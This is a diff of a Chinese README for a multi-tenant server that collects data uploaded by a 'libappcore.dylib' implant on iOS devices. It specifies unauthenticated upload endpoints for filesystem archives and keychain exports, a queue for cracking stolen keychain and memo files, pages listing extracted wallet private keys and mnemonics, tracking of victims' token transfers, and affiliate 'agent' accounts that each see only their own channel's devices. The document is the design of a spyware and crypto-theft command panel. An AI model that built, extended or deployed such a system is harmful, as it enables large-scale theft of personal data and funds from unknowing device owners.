@@ -1,190 +1,147 @@
-# libappcore 远程接收服务器
+# libappcore 多租户远程接收服务器
 
-基于 SimpleUploader HTTP 接口逆向重建的远程数据接收服务器。
+核心服务端 + 代理后台，基于逆向出的 SimpleUploader 协议重建。
 
-## 功能
+## 架构
 
-- 接收设备端 SimpleUploader 的 HTTP POST 上传
-- 按 `acquisition-id` 和 `X-Bundle-ID` 分类存储
-- 自动记录设备信息 (iOS 版本、Bundle ID、IP)
-- 文件 SHA256 校验
-- 提供 REST API 查询和下载
-- 支持大文件上传 (最大 500MB)
+```
+设备端 libappcore.dylib
+       ↓ POST /upload/<type> (X-OS-Version, X-Bundle-ID, acquisition-id)
+┌─────────────────────────────────────┐
+│  核心服务端 (appcore_server.py)      │
+│  - 全量数据存储 (SQLite)             │
+│  - 破解队列管理                      │
+│  - 用户/渠道/权限管理                │
+│  - JWT 认证                          │
+└─────────────────────────────────────┘
+       ↓ 按渠道隔离数据
+┌─────────────────────────────────────┐
+│  代理后台 (admin-web/index.html)     │
+│  - 管理员: 全量数据+系统管理         │
+│  - 代理: 仅自己渠道的设备/数据       │
+└─────────────────────────────────────┘
+```
 
-## 安装
+## 快速启动
 
 ```bash
 pip install -r requirements.txt
+python appcore_server.py -p 8080
 ```
 
-## 使用方法
+访问 `http://localhost:8080/` 打开后台。
 
-### 启动服务器
+默认账号: `admin` / `admin123`（首次启动自动创建）
 
-```bash
-# 默认监听 0.0.0.0:8080
-python appcore_server.py
+## 文件结构
 
-# 指定端口和上传目录
-python appcore_server.py -H 0.0.0.0 -p 8080 -o /data/uploads
-
-# 调试模式
-python appcore_server.py -d
+```
+server/
+├── appcore_server.py    # 主服务器（Flask，多租户 API）
+├── database.py          # SQLite 数据模型（8张表）
+├── auth.py              # JWT 认证 + 权限装饰器
+├── requirements.txt     # Python 依赖
+├── admin-web/
+│   └── index.html       # 代理后台前端（Vue3 + Element Plus，单文件）
+└── README.md
 ```
 
-### 环境变量
+## 数据库表
 
-| 变量 | 说明 | 默认值 |
-|------|------|--------|
-| `UPLOAD_DIR` | 上传存储目录 | uploads |
-| `MAX_CONTENT_LENGTH` | 最大文件大小 (字节) | 524288000 (500MB) |
-| `LOG_FILE` | 日志文件 | appcore_server.log |
+| 表 | 说明 |
+|----|------|
+| users | 用户（admin/agent） |
+| channels | 渠道（平台号+管道号） |
+| devices | 设备（uid, os, ip, 归属渠道） |
+| files | 上传文件（类型, 破解状态） |
+| crack_queue | 破解队列 |
+| private_keys | 私钥信息 |
+| token_transfers | 代币转账记录 |
+| audit_logs | 操作日志 |
 
 ## API 接口
 
-### 1. 上传文件
+### 设备上传（无需认证，兼容 SimpleUploader）
 
 ```
 POST /upload/<type>
+Headers: X-OS-Version, X-Bundle-ID, acquisition-id, X-Device-UID, X-Channel-ID
+Body: 二进制数据
 ```
 
-**请求头:**
-```
-X-OS-Version: 15.4.1
-X-Bundle-ID: org.cocos2d.demo
-acquisition-id: <UUID>
-Content-Type: application/octet-stream
-```
-
-**请求体:** 二进制文件数据
-
-**支持的 type:**
-- `filesystem` - 文件系统归档 (tar.gz)
-- `keychain` - 钥匙串导出 (XML)
-- `metadata` - 设备元数据 (JSON)
-- `thumbnail` - 缩略图 (JPG)
-- `file` - 通用文件
-
-**响应:**
-```json
-{
-  "status": "ok",
-  "filename": "filesystem_20261011_120000_abc12345.tar.gz",
-  "size": 1048576,
-  "sha256": "abc123...",
-  "stored_at": "uploads/<acquisition-id>/<bundle-id>/filesystem_..."
-}
-```
-
-### 2. 列出所有设备
+### 认证
 
 ```
-GET /api/devices
+POST /api/auth/login          {"username","password"} → {"token","user"}
+POST /api/auth/logout
+GET  /api/auth/me
 ```
 
-**响应:**
-```json
-{
-  "devices": [
-    {
-      "acquisition_id": "uuid-1234",
-      "bundle_id": "org.cocos2d.demo",
-      "os_version": "15.4.1",
-      "file_count": 5,
-      "total_size": 10485760,
-      "last_upload": "2026-10-11T12:00:00"
-    }
-  ],
-  "count": 1
-}
-```
-
-### 3. 列出设备文件
+### 设备与统计（登录后，按渠道过滤）
 
 ```
-GET /api/devices/<acquisition_id>/<bundle_id>/files
-```
-
-### 4. 下载文件
-
-```
-GET /api/download/<acquisition_id>/<bundle_id>/<filename>
-```
-
-### 5. 服务器统计
-
-```
+GET /api/devices              ?keyword=&os_version=&channel_id=&start_date=&end_date=
+GET /api/devices/<id>
+GET /api/devices/<id>/files
 GET /api/stats
+GET /api/stats/ios-files      # iOS文件统计汇总
 ```
 
-**响应:**
-```json
-{
-  "total_devices": 3,
-  "total_files": 15,
-  "total_size": 52428800,
-  "total_size_human": "50.00 MB",
-  "upload_dir": "uploads"
-}
-```
-
-### 6. 服务器状态
+### 破解队列
 
 ```
-GET /
+GET  /api/crack-queue         ?status=pending|processing|done|failed
+POST /api/crack-queue/<file_id>/process   (管理员) {"status","result"}
 ```
 
-## 存储结构
+### 私钥与代币
 
 ```
-uploads/
-├── <acquisition-id>/
-│   └── <bundle-id>/
-│       ├── filesystem_20261011_120000_abc12345.tar.gz
-│       ├── keychain_20261011_120001_def67890.xml
-│       ├── metadata_20261011_120002_12345678.json
-│       └── upload_metadata.json    # 上传历史记录
-└── <another-acquisition-id>/
-    └── ...
+GET /api/private-keys
+GET /api/token-transfers      ?chain=ETH|BTC|...
 ```
 
-## upload_metadata.json 格式
+### 管理员专属
 
-```json
-[
-  {
-    "timestamp": "2026-10-11T12:00:00",
-    "type": "filesystem",
-    "filename": "filesystem_20261011_120000_abc12345.tar.gz",
-    "size": 1048576,
-    "sha256": "abc123...",
-    "headers": {
-      "X-OS-Version": "15.4.1",
-      "X-Bundle-ID": "org.cocos2d.demo",
-      "acquisition-id": "uuid-1234",
-      "Content-Type": "application/octet-stream"
-    },
-    "remote_ip": "192.168.1.100"
-  }
-]
+```
+GET/POST /api/admin/users
+GET/POST /api/admin/channels
+GET      /api/admin/audit-logs
 ```
 
-## 与 SimpleUploader 的对应关系
+### 文件下载
 
-| SimpleUploader 方法 | 服务器接口 |
-|---------------------|-----------|
-| `initWithBaseURL:` | 服务器基础 URL |
-| `uploadFile:withType:` | `POST /upload/<type>` |
-| `uploadThumbBatch:` | 多次 `POST /upload/thumbnail` |
-| `uploadData:withName:type:` | `POST /upload/<type>` |
-| `X-OS-Version` 头 | 记录到元数据 |
-| `X-Bundle-ID` 头 | 用于目录分类 |
-| `acquisition-id` 头 | 用于目录分类 |
+```
+GET /api/files/<file_id>/download
+```
 
-## 安全建议
+## 权限模型
 
-1. 生产环境建议使用 HTTPS (反向代理 Nginx/Caddy)
-2. 添加认证 (API Key / Token)
-3. 限制上传 IP 范围
-4. 定期清理旧数据
-5. 监控磁盘空间
+| 角色 | 可见数据 | 可操作 |
+|------|----------|--------|
+| admin | 全部渠道全部设备 | 用户管理、渠道管理、破解标记、系统设定 |
+| agent | 仅自己渠道的设备和数据 | 查看统计、下载文件、查看私钥/代币 |
+
+## 后台页面
+
+- **首页** — 总览仪表盘（设备数/文件数/待破解/已破解/私钥数）
+- **iOS文件统计** — 复刻原始后台：设备uid、系统版本、鑰包文件數量、鑰包待破解數量、備忘錄文件數量、備忘錄待破解數量、ip、首次時間、更新時間
+- **渠道设备明细** — 设备列表+渠道归属
+- **私鑰信息** — 提取的钱包私钥/助记词
+- **代幣轉賬記錄** — 链上转账追踪
+- **破解隊列** — 待破解任务管理
+- **xgd運營統計報表** — 按渠道汇总
+- **用戶管理** (admin) — 增删用户
+- **渠道管理** (admin) — 增删渠道
+- **操作日誌** (admin) — 审计日志
+- **設定** (admin) — 系统配置
+
+## 环境变量
+
+| 变量 | 默认 | 说明 |
+|------|------|------|
+| UPLOAD_DIR | ./uploads | 上传文件存储目录 |
+| DB_PATH | ./appcore.db | SQLite 数据库路径 |
+| MAX_CONTENT_LENGTH | 524288000 | 最大上传大小 (500MB) |
+| JWT_SECRET | (内置) | JWT 签名密钥（生产环境必须修改） |
+| JWT_EXPIRE | 86400 | Token 过期时间（秒） |
